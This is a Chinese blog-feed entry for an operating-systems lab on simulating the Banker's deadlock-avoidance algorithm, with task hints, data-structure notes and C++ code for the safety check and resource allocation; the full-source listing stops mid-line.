    <content type="html"><![CDATA[<h2 id="一、实验内容"><a href="#一、实验内容" class="headerlink" title="一、实验内容"></a>一、实验内容</h2><ul><li>运用某种高级语言（如C或C++）模拟银行家算法的处理过程。</li></ul><h2 id="二、实验目的"><a href="#二、实验目的" class="headerlink" title="二、实验目的"></a>二、实验目的</h2><ul><li>银行家算法是避免死锁的代表性算法。本实验旨在加深了解有关资源申请、避免死锁、状态安全性等概念，并体会和运用避免死锁的具体实施方法。然后依照本实验，自行设计模拟程序</li></ul><h2 id="三、实验题目"><a href="#三、实验题目" class="headerlink" title="三、实验题目"></a>三、实验题目</h2><p>银行家算法的模拟</p><ul><li><p>提示1</p><p>我们可以把操作系统看作是银行家，操作系统管理的资源相当于银行家管理的资金，进程向操作系统请求分配资源相当于用户向银行家贷款。操作系统按照银行家制定的规则为进程分配资源。</p><p>当进程首次申请资源时，要测试该进程对资源的最大需求量，如果系统现存的资源可以满足它的最大需求量则按当前的申请量分配资源，否则就推迟分配。当进程在执行中继续申请资源时，先测试该进程已占用的资源数与本次申请的资源数之和是否超过了该进程对资源的最大需求量。若超过则拒绝分配资源，若没有超过则再测试系统现存的资源能否满足该进程尚需的最大资源量，若能满足则按当前的申请量分配资源，否则也要推迟分配。</p></li><li><p>提示2</p><p>安全状态：如果存在一个由系统中所有进程构成的安全序列P1，…，Pn，则系统处于安全状态。安全状态一定是没有死锁发生。</p><p>不安全状态:不存在一个安全序列。不安全状态一定导致死锁。</p><p>安全序列：一个进程序列{P1，…，Pn}是安全的，如果对于每一个进程Pi(1≤i≤n），它以后尚需要的资源量不超过系统当前剩余资源量与所有进程Pj (j &lt; i )当前占有资源量之和。</p></li><li><p>提示3</p><p>设request<del>i</del>为进程p[i]的请求向量，如果request<del>i</del>[j]=K，表示进程p[i]需要K个Rj资源。当系统发出请求后，系统按下述步骤开始检查：</p><ol><li><p>如果request<del>i</del>[j]&lt;=need[i][j],转向步骤2；否则报告出错，申请的资源已经大于它需要的最大值。</p></li><li><p>如果request<del>i</del>[j]&lt;=available[j],转向步骤3；否则报告出错，尚无足够的资源。</p></li><li><p>系统试探着把资源分配给p[i]，并修改下列数据结构中的值：</p><p>available[j]=available[j]request[j]<br>allocation[i][j]=allocation[i][j]+request[j]<br>need[i][j]=need[i][j]-request[j]</p></li><li><p>系统进行安全性算法，检查此次分配后，系统是否还处于安全状态，若安全，把资源分配给进程p[i]；否则，恢复原来的资源分配状态，让进程p[i]等待。</p></li></ol></li><li><p>提示4</p><p>安全性算法：<br>int work[RESOURCE_NUMBER]；<br>bool finish[PROCESS_NUMBER]；</p><ol><li>Work=Available;<br>Finish=false;</li><li>寻找满足条件的i：<br>A、Finish[i]=false;<br>B、Need[i]≤Work;<br>如果不存在，则转4)</li><li>Work:=Work+Allocation[i]； Finish[i]:=true；转2</li><li>若对所有i,Finish[i]=true,则系统处于安全状态，<br>否则处于不安全状态</li></ol></li><li><p>提示5</p><p>(银行家算法的程序流程图)</p><p><img src="/2021/11/30/%E9%93%B6%E8%A1%8C%E5%AE%B6%E7%AE%97%E6%B3%95/image-20211128102425394.png" alt="image-20211128102425394"></p><p><strong>思考题</strong></p></li></ul><p>设计本实验时，就尽可能的将设计人性化和考虑全面。如：能不断地进行资源分配;能修改资源的初始状态;提示信息就能充分反映算法过程等。</p><h2 id="四、实验设计与过程"><a href="#四、实验设计与过程" class="headerlink" title="四、实验设计与过程"></a>四、实验设计与过程</h2><h4 id="数据结构和符号说明"><a href="#数据结构和符号说明" class="headerlink" title="数据结构和符号说明"></a>数据结构和符号说明</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> Available[M],     <span class="hljs-comment">//每种资源现有的实例数量</span><br>    Max[N][M],        <span class="hljs-comment">//每个进程i的对资源j最大需求</span><br>    Allocation[N][M], <span class="hljs-comment">//每个进程现在所分配的每个资源的实例数量</span><br>    Need[N][M],       <span class="hljs-comment">//每个进程还需要的剩余的资源</span><br>    Request[N][M],    <span class="hljs-comment">//进程资源请求</span><br>    sign[N],          <span class="hljs-comment">//记录安全序列</span><br>    process_num,      <span class="hljs-comment">//进程数量</span><br>    recourse_num;     <span class="hljs-comment">//资源数量</span><br></code></pre></td></tr></table></figure><h4 id="函数说明"><a href="#函数说明" class="headerlink" title="函数说明"></a>函数说明</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span> <span class="hljs-comment">//初始化进程资源状况</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">print_information</span><span class="hljs-params">()</span> <span class="hljs-comment">//打印进程资源表</span></span><br></code></pre></td></tr></table></figure><h5 id="安全性检查算法"><a href="#安全性检查算法" class="headerlink" title="安全性检查算法"></a><strong>安全性检查算法</strong></h5><p>算法思路</p><ol><li>初始化Work=Available; Finish=false;</li><li>寻找满足条件的i： A、Finish[i]=false; B、Need[i]≤Work; 如果不存在，则转4)</li><li>Work:=Work+Allocation[i]； Finish[i]:=true；同时记录安全序列；转2</li><li>若对所有i,Finish[i]=true,则系统处于安全状态， 否则处于不安全状态</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">security_test</span><span class="hljs-params">()</span> <span class="hljs-comment">//安全性检查</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> work[recourse_num];<br>    <span class="hljs-keyword">bool</span> finish[process_num];<br>    <span class="hljs-keyword">int</span> count, k = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; recourse_num; i++) <span class="hljs-comment">//初始化work</span><br>    &#123;<br>        work[i] = Available[i];<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; process_num; i++) <span class="hljs-comment">//设置false</span><br>    &#123;<br>        finish[i] = <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; process_num; i++) <span class="hljs-comment">////满足条件释放资源，并从头开始扫描进程集合</span><br>    &#123;<br>        count = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>            <span class="hljs-keyword">if</span> (finish[i] == <span class="hljs-literal">false</span> &amp;&amp; Need[i][j] &lt;= work[j])<br>                count++;<br>        <span class="hljs-keyword">if</span> (count == recourse_num) <span class="hljs-comment">//当进程各类资源都满足NEED&lt;=WORK时</span><br>        &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>                work[j] = work[j] + Allocation[i][j]; <span class="hljs-comment">//释放进程</span><br>            finish[i] = <span class="hljs-literal">true</span>;<br>            sign[k] = i; <span class="hljs-comment">//记录下满足条件的进程</span><br>            k++;<br>            i = <span class="hljs-number">-1</span>; <span class="hljs-comment">//从头开始扫描</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; process_num; i++)<br>        <span class="hljs-keyword">if</span> (finish[i] == <span class="hljs-literal">false</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="银行家算法"><a href="#银行家算法" class="headerlink" title="银行家算法"></a>银行家算法</h5><p>算法思路：</p><ol><li><p>首先进行特殊情况判断</p><ul><li>资源不足和申请资源超过最大请求</li></ul></li><li><p>然后尝试进行资源分配</p><p>available[j]=available[j]request[j]<br>allocation[i][j]=allocation[i][j]+request[j]<br>need[i][j]=need[i][j]-request[j]</p></li><li><p>系统进行安全性算法，检查此次分配后，系统是否还处于安全状态，若安全，把资源分配给进程p[i]；否则，恢复原来的资源分配状态，让进程p[i]等待。</p></li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">Banker_Algorithm</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i)</span> <span class="hljs-comment">//银行家算法</span></span><br><span class="hljs-function"></span>&#123;<span class="hljs-comment">//首先进行特殊情况判断</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> m = <span class="hljs-number">0</span>; m &lt; recourse_num; m++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (Request[i][m] &gt; Need[i][m])<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-string">&quot;所需资源数超出其宣布的最大值!&quot;</span> &lt;&lt; endl;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Request[i][m] &gt; Available[m])<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-string">&quot;无足够资源，p[&quot;</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot;]需等待!&quot;</span> &lt;&lt; endl;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//尝试为进程分配资源</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>    &#123;<br>        Available[j] = Available[j] - Request[i][j];<br>        Allocation[i][j] = Allocation[i][j] + Request[i][j];<br>        Need[i][j] = Need[i][j] - Request[i][j];<br>    &#125;<br>    cout &lt;&lt; <span class="hljs-string">&quot;尝试进行资源分配后的进程资源表: &quot;</span> &lt;&lt; endl;<br>    <span class="hljs-built_in">print_information</span>();<br>    <span class="hljs-comment">//执行安全性算法</span><br>    cout &lt;&lt; <span class="hljs-string">&quot;正在进行安全性检查&quot;</span> &lt;&lt; endl;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">security_test</span>())<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;经安全性检查，系统安全，本次分配成功&quot;</span> &lt;&lt; endl;<br>        cout &lt;&lt; <span class="hljs-string">&quot;安全进程序列为：&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; process_num - <span class="hljs-number">1</span>; i++)<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-string">&quot;P[&quot;</span> &lt;&lt; sign[i] &lt;&lt; <span class="hljs-string">&quot;]---&gt;&quot;</span>;<span class="hljs-comment">//输出安全的进程序列</span><br>        &#125;<br>        cout &lt;&lt; <span class="hljs-string">&quot;P[&quot;</span> &lt;&lt; sign[process_num - <span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-string">&quot;]&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;安全性检测失败!系统不安全!!!正在恢复资源分配------&quot;</span> &lt;&lt; endl;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<span class="hljs-comment">//恢复进程资源分配</span><br>        &#123;<br>            Available[j] = Available[j] + Request[i][j];<br>            Allocation[i][j] = Allocation[i][j] - Request[i][j];<br>            Need[i][j] = Need[i][j] + Request[i][j];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="完整源代码"><a href="#完整源代码" class="headerlink" title="完整源代码"></a>完整源代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> N 100</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> M 100</span><br><span class="hljs-keyword">int</span> Available[M],     <span class="hljs-comment">//每种资源现有的实例数量</span><br>    Max[N][M],        <span class="hljs-comment">//每个进程i的对资源j最大需求</span><br>    Allocation[N][M], <span class="hljs-comment">//每个进程现在所分配的每个资源的实例数量</span><br>    Need[N][M],       <span class="hljs-comment">//每个进程还需要的剩余的资源</span><br>    Request[N][M],    <span class="hljs-comment">//进程资源请求</span><br>    sign[N],          <span class="hljs-comment">//记录安全序列</span><br>    process_num,      <span class="hljs-comment">//进程数量</span><br>    recourse_num;     <span class="hljs-comment">//资源数量</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span> <span class="hljs-comment">//初始化进程资源状况</span></span><br><span class="hljs-function"></span>&#123;<br>    cin &gt;&gt; process_num &gt;&gt; recourse_num;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; process_num; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>        &#123;<br>            cin &gt;&gt; Allocation[i][j];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; process_num; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>        &#123;<br>            cin &gt;&gt; Max[i][j];<br>            Need[i][j] = Max[i][j] - Allocation[i][j];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>    &#123;<br>        cin &gt;&gt; Available[j];<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">print_information</span><span class="hljs-params">()</span> <span class="hljs-comment">//打印进程资源表</span></span><br><span class="hljs-function"></span>&#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;-----------------------------------进程资源表------------------------------------&quot;</span> &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;|    进程名称   |   已占用资源  |    尚需资源   |  最大所需资源 |  资源剩余实例 |&quot;</span> &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;|&quot;</span> &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">16</span>) &lt;&lt; <span class="hljs-string">&quot;|&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span> * recourse_num; j++)<br>    &#123;<br><br>        cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">4</span>) &lt;&lt; <span class="hljs-built_in"><span class="hljs-keyword">char</span></span>(j % recourse_num + <span class="hljs-string">&#x27;A&#x27;</span>);<br>        <span class="hljs-keyword">if</span> ((j + <span class="hljs-number">1</span>) % recourse_num == <span class="hljs-number">0</span>)<br>            cout &lt;&lt; <span class="hljs-string">&quot;   |&quot;</span>;<br>    &#125;<br>    cout &lt;&lt; endl;<br>    <span class="hljs-keyword">int</span> k = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; process_num; i++)<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;|&quot;</span> &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; <span class="hljs-string">&quot;P[&quot;</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot;]&quot;</span>; <span class="hljs-comment">//进程名称</span><br>        cout &lt;&lt; <span class="hljs-string">&quot;   |&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">4</span>) &lt;&lt; Allocation[i][j]; <span class="hljs-comment">//已占用资源</span><br>        &#125;<br>        cout &lt;&lt; <span class="hljs-string">&quot;   |&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">4</span>) &lt;&lt; Need[i][j]; <span class="hljs-comment">//尚需资源</span><br>        &#125;<br>        cout &lt;&lt; <span class="hljs-string">&quot;   |&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">4</span>) &lt;&lt; Max[i][j]; <span class="hljs-comment">//最大所需资源</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> (k == <span class="hljs-number">0</span>)<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-string">&quot;   |&quot;</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>            &#123;<br>                cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">4</span>) &lt;&lt; Available[j]; <span class="hljs-comment">//资源剩余实例</span><br>            &#125;<br>            cout &lt;&lt; <span class="hljs-string">&quot;   |&quot;</span> &lt;&lt; endl;<br>            k = <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>            cout &lt;&lt; <span class="hljs-string">&quot;   |&quot;</span> &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">16</span>) &lt;&lt; <span class="hljs-string">&quot;|&quot;</span> &lt;&lt; endl;<br>    &#125;<br>    cout &lt;&lt; <span class="hljs-string">&quot;---------------------------------------------------------------------------------&quot;</span> &lt;&lt; endl<br>         &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">security_test</span><span class="hljs-params">()</span> <span class="hljs-comment">//安全性检查</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> work[recourse_num];<br>    <span class="hljs-keyword">bool</span> finish[process_num];<br>    <span class="hljs-keyword">int</span> count, k = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; recourse_num; i++) <span class="hljs-comment">//初始化work</span><br>    &#123;<br>        work[i] = Available[i];<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; process_num; i++) <span class="hljs-comment">//设置false</span><br>    &#123;<br>        finish[i] = <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; process_num; i++) <span class="hljs-comment">////满足条件释放资源，并从头开始扫描进程集合</span><br>    &#123;<br>        count = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>            <span class="hljs-keyword">if</span> (finish[i] == <span class="hljs-literal">false</span> &amp;&amp; Need[i][j] &lt;= work[j])<br>                count++;<br>        <span class="hljs-keyword">if</span> (count == recourse_num) <span class="hljs-comment">//当进程各类资源都满足NEED&lt;=WORK时</span><br>        &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>                work[j] = work[j] + Allocation[i][j]; <span class="hljs-comment">//释放进程</span><br>            finish[i] = <span class="hljs-literal">true</span>;<br>            sign[k] = i; <span class="hljs-comment">//记录下满足条件的进程</span><br>            k++;<br>            i = <span class="hljs-number">-1</span>; <span class="hljs-comment">//从头开始扫描</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; process_num; i++)<br>        <span class="hljs-keyword">if</span> (finish[i] == <span class="hljs-literal">false</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">Banker_Algorithm</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i)</span> <span class="hljs-comment">//银行家算法</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> m = <span class="hljs-number">0</span>; m &lt; recourse_num; m++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (Request[i][m] &gt; Need[i][m])<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-string">&quot;所需资源数超出其宣布的最大值!&quot;</span> &lt;&lt; endl;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Request[i][m] &gt; Available[m])<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-string">&quot;无足够资源，p[&quot;</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot;]需等待!&quot;</span> &lt;&lt; endl;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//尝试为进程分配资源</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>    &#123;<br>        Available[j] = Available[j] - Request[i][j];<br>        Allocation[i][j] = Allocation[i][j] + Request[i][j];<br>        Need[i][j] = Need[i][j] - Request[i][j];<br>    &#125;<br>    cout &lt;&lt; <span class="hljs-string">&quot;尝试进行资源分配后的进程资源表: &quot;</span> &lt;&lt; endl;<br>    <span class="hljs-built_in">print_information</span>();<br>    <span class="hljs-comment">//执行安全性算法</span><br>    cout &lt;&lt; <span class="hljs-string">&quot;正在进行安全性检查&quot;</span> &lt;&lt; endl;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">security_test</span>())<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;经安全性检查，系统安全，本次分配成功&quot;</span> &lt;&lt; endl;<br>        cout &lt;&lt; <span class="hljs-string">&quot;安全进程序列为：&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; process_num - <span class="hljs-number">1</span>; i++)<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-string">&quot;P[&quot;</span> &lt;&lt; sign[i] &lt;&lt; <span 